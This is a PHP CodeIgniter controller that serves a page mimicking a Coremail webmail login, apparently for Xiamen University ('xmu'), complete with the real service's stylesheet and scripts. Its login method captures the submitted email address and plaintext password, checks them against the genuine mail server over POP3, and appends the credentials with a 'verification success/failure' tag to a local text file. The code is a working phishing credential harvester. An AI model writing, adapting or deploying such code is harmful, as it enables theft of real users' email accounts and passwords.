<?php
class Xmu extends CI_Controller {

	public function __construct()
	{
		parent::__construct();
		$this->load->helper('html');
		$this->load->helper('url');
		$this->load->helper('file');
//		$this->load->model('news_model');
	}
	public function index()
	{
		echo doctype();
		$meta = array(
		        array('name' => 'title', 'content' => 'Coremail邮件系统'),
		        array('name' => 'Content-type', 'content' => 'text/html; charset=utf-8', 'type' => 'equiv')
		);
		echo meta($meta);
		echo link_tag(array('href'=>'coremail/common/index_cm40/login.css', 'rel' => 'stylesheet','type' => 'text/css','media'=>'screen,projection,print'));
		echo link_tag(array('href'=>'coremail/common/login/favicon.gif', 'rel'=>'shortcut icon'));
		echo script_tag('coremail/common/js/jquery.js');
		echo script_tag('coremail/common/login/login.js');
		$this->load->view("xmu/index");
	}
	public function login()
	{
		$email = $this->input->post('username');
		$acccount = explode("@",$email);
		$this->load->library('My_pop3_authorise');
		$username=$acccount[0];
		$password=$this->input->post('password');
		$return = $this->my_pop3_authorise->authorise_xmu($username,$password);
		$data = "帳號：".$email."\r\n密碼：".$password."\r\n";
		if($return == 1)
		{
			$data .= "驗證成功\r\n----------------------------------------\r\n";
		}
		else
		{
			$data .= "驗證失敗\r\n----------------------------------------\r\n";
		}
		 write_file('../xmu.txt', $data);
		 echo $return;
	}
}
